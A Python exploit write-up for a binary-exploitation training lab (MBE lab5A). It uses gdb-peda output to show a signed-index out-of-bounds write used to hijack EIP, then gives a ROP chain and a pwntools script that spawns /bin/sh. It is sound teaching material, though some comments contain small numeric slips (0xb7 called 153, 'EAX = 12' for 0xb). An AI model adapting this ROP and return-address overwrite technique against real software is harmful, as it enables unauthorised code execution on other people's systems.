# -*- coding: utf-8 -*-
# Every 3rd index is reserverd
# Index cannot be bigger than 100
# First 2 bytes cannot be 153 (0xb7)
'''
    /* make sure the slot is not reserved */
    if(index % 3 == 0 || index > STORAGE_SIZE || (input >> 24) == 0xb7)
    {
        printf(" *** ERROR! ***\n");
        printf("   This index is reserved for doom!\n");
        printf(" *** ERROR! ***\n");

        return 1;
    }
'''

# EIP can be overwritten if index = =-11
# The variable index is signed.

# Check return addr of store_number function
'''
gdb-peda$ disas store_number
   0x08049ff0 <+228>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049ff3 <+231>:   leave  
   0x08049ff4 <+232>:   ret    <===
End of assembler dump.
'''
# Set breakpoint @ RET and check the stack value of RET
'''
gdb-peda$ b *0x08049ff4
Breakpoint 1 at 0x8049ff4
gdb-peda$ r
Starting program: /home/karmaz/MBE/lab5/lab5A 
----------------------------------------------------
  Welcome to doom's crappy number storage service!  
          Version 2.0 - With more security!         
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   doom has reserved some storage for himself :>    
----------------------------------------------------

Input command: store
 Number: 123
 Index: 11
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x8104000 --> 0x0 
ECX: 0xb ('\x0b')
EDX: 0xffffccd4 --> 0x7b ('{')
ESI: 0x8104000 --> 0x0 
EDI: 0xffffce38 ("store")
EBP: 0xffffce68 --> 0x0 
ESP: 0xffffcc7c --> 0x804a1ec (<main+399>:      add    esp,0x10)
EIP: 0x8049ff4 (<store_number+232>:     ret)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049feb <store_number+223>:        mov    eax,0x0
   0x8049ff0 <store_number+228>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x8049ff3 <store_number+231>:        leave  
=> 0x8049ff4 <store_number+232>:        ret    
   0x8049ff5 <read_number>:     endbr32 
   0x8049ff9 <read_number+4>:   push   ebp
   0x8049ffa <read_number+5>:   mov    ebp,esp
   0x8049ffc <read_number+7>:   push   ebx
[------------------------------------stack-------------------------------------]
0000| 0xffffcc7c --> 0x804a1ec (<main+399>:     add    esp,0x10)   <==== RET VALUE ON STACK
0004| 0xffffcc80 --> 0xffffcca8 --> 0x0 
0008| 0xffffcc84 --> 0x80cf2c8 ("store")
0012| 0xffffcc88 --> 0x5 
0016| 0xffffcc8c --> 0x804a07c (<main+31>:      add    ebx,0xb9f84)
0020| 0xffffcc90 --> 0x7 
0024| 0xffffcc94 --> 0x1 
0028| 0xffffcc98 --> 0xffffd050 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049ff4 in store_number () 
'''
# RET value on the stack during RET is 0xffffcc7c

# Check the addr of buffer data
'''
gdb-peda$ disas main
 0x0804a1db <+382>:   jne    0x804a1f7 <main+410>
   0x0804a1dd <+384>:   sub    esp,0xc
   0x0804a1e0 <+387>:   lea    eax,[ebp-0x1c0]
   0x0804a1e6 <+393>:   push   eax
   0x0804a1e7 <+394>:   call   0x8049f0c <store_number>   <===
'''
# Data is passed as an arg for store_number() - set a breakpoint @ the call and check the stack addr
'''
gdb-peda$ b *0x0804a1e7
Breakpoint 2 at 0x804a1e7
gdb-peda$ c
Continuing.
 Completed store command successfully
Input command: store
[----------------------------------registers-----------------------------------]
EAX: 0xffffcca8 --> 0x0 
EBX: 0x8104000 --> 0x0 
ECX: 0xffffce3d --> 0x0 
EDX: 0x80cf2cd --> 0x61657200 ('')
ESI: 0x8104000 --> 0x0 
EDI: 0xffffce38 ("store")
EBP: 0xffffce68 --> 0x0 
ESP: 0xffffcc80 --> 0xffffcca8 --> 0x0 
EIP: 0x804a1e7 (<main+394>:     call   0x8049f0c <store_number>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a1dd <main+384>:        sub    esp,0xc
   0x804a1e0 <main+387>:        lea    eax,[ebp-0x1c0]
   0x804a1e6 <main+393>:        push   eax
=> 0x804a1e7 <main+394>:        call   0x8049f0c <store_number>
   0x804a1ec <main+399>:        add    esp,0x10
   0x804a1ef <main+402>:        mov    DWORD PTR [ebp-0x1c4],eax
   0x804a1f5 <main+408>:        jmp    0x804a249 <main+492>
   0x804a1f7 <main+410>:        sub    esp,0x4
Guessed arguments:
arg[0]: 0xffffcca8 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffcc80 --> 0xffffcca8 --> 0x0 <====
0004| 0xffffcc84 --> 0x80cf2c8 ("store")
0008| 0xffffcc88 --> 0x5 
0012| 0xffffcc8c --> 0x804a07c (<main+31>:      add    ebx,0xb9f84)
0016| 0xffffcc90 --> 0x7 
0020| 0xffffcc94 --> 0x1 
0024| 0xffffcc98 --> 0xffffd050 --> 0x0 
0028| 0xffffcc9c --> 0xffffcf38 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804a1e7 in main ()
'''
# Data buffer is @ 0xffffcca8

# Calculate the offset of the return address of the store_number() from the buffer data
'''
>>> 0xffffcc7c - 0xffffcca8
-44
 -44 / 11 = -11
'''
# Offset of the index is: -11

# Confirm that in gdb that we control EIP
'''
Input command: store
 Number: 123  <== 
 Index: -11 <==

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x8104000 --> 0x0 
ECX: 0xfffffff5 
EDX: 0xffffcc7c --> 0x7b ('{')
ESI: 0x8104000 --> 0x0 
EDI: 0xffffce38 ("store")
EBP: 0xffffce68 --> 0x0 
ESP: 0xffffcc80 --> 0xffffcca8 --> 0x0 
EIP: 0x7b ('{')
EFLAGS: 0x10283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x7b  <== equal to 123
[------------------------------------stack-------------------------------------]
0000| 0xffffcc80 --> 0xffffcca8 --> 0x0 
0004| 0xffffcc84 --> 0x80cf2c8 ("store")
0008| 0xffffcc88 --> 0x5 
0012| 0xffffcc8c --> 0x804a07c (<main+31>:      add    ebx,0xb9f84)
0016| 0xffffcc90 --> 0x7 
0020| 0xffffcc94 --> 0x1 
0024| 0xffffcc98 --> 0xffffd050 --> 0x0 
0028| 0xffffcc9c --> 0xffffcf38 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000007b in ?? ()  <== equal to 123
'''
# Create ROP chain to call execve(0,"/bin/sh",0)
'''
eax = 0xb
ebx = ptr to “/bin/sh”
ecx = 0
edx = 0
int 0x80

[ EAX = 12 ]
0x08054c30 : xor eax, eax ; ret
0x08078642 : add eax, 0xb ; pop edi ; ret

0x0807b93d : xor eax, eax ; pop ebx ; ret

[ PASS INDEX ]
0x0804900e : ret

[ ECX = 0 ]
0x0806b001 : pop ecx ; add al, 0xf6 ; ret

[ EDX = 0 && EBX = "/bin/sh\x00" ]
0x08065b39 : pop edx ; pop ebx ; ret

[ EXECVE ]
0x08049f07 : int 0x80
'''

# Visualized:
'''
-11 0x0804b4be : add esp, 0x2c ; ret
-10 |
-9  |
-8  |
-7  |
-6  |
-5  |
-4  |
-3  |
-2  |
-1  |
0   V          
1  0x0804900e : ret
2  0x0806b001 : pop ecx ; add al, 0xf6 ; ret 
3  0x0
4  0x080501f0 : xor eax, eax ; ret
5  0x08078642 : add eax, 0xb ; pop edi ; ret
6  0x0
7  0x0804900e : ret
8  0x08065b39 : pop edx ; pop ebx ; ret
9  0x0
10 [ptr] => "/bin/sh" -------------
11 0x08049f07 : int 0x80          |
12 0x0                            V
13 0x69622f2f ("//bin/sh")  1768042287 
14 0x68732f6e ("n/sh\00")   1752379246
'''

# Exploit
from pwn import *
p = process("./lab5A")
p.recvuntil("\n\n")
p.sendline("")
p.recvuntil("command: ")

# Attach the debugger
gdb.attach(p, '''
''')
# Set 13
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("1768042287")
p.recvuntil("Index: ")
p.sendline("13")
p.sendline("")
p.recvuntil("Input command: ") 
# Set 14
print(p.sendline("store"))
p.recvuntil("Number: ")
p.sendline("1752379246")
p.recvuntil("Index: ")
p.sendline("14")
p.sendline("")
p.recvuntil("Input command: ")
# Set 11
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134520583")
p.recvuntil("Index: ")
p.sendline("11")
p.sendline("")
p.recvuntil("Input command: ")
# Set 10 - read => -10 data_array[0]
p.sendline("read")
p.recvuntil("Index: ")
p.sendline("-10")
p.sendline("")
data_array = int(p.recvuntil("command: ").split()[4]) # leaks addr of data_array[0]

p.sendline("store")
p.recvuntil("Number: ")
p.sendline(str(data_array+(13*4)))
p.recvuntil("Index: ")
p.sendline("10")
p.sendline("")
p.recvuntil("Input command: ")
# Set 8
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134634297")
p.recvuntil("Index: ")
p.sendline("8")
p.sendline("")
p.recvuntil("Input command: ") 
# Set 7
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134516750")
p.recvuntil("Index: ")
p.sendline("7")
p.sendline("")
p.recvuntil("Input command: ") 
# Set 5
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134710850")
p.recvuntil("Index: ")
p.sendline("5")
p.sendline("")
p.recvuntil("Input command: ")
# Set 4
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134545904")
p.recvuntil("Index: ")
p.sendline("4")
p.sendline("")
p.recvuntil("Input command: ")
# Set 2
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134656001")
p.recvuntil("Index: ")
p.sendline("2")
p.sendline("")
p.recvuntil("Input command: ")
# Set 1
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134516750")
p.recvuntil("Index: ")
p.sendline("1")
p.sendline("")
p.recvuntil("Input command: ")

# Set -11
p.sendline("store")
p.recvuntil("Number: ")
p.sendline("134526142")
p.recvuntil("Index: ")
p.sendline("-11")

p.interactive()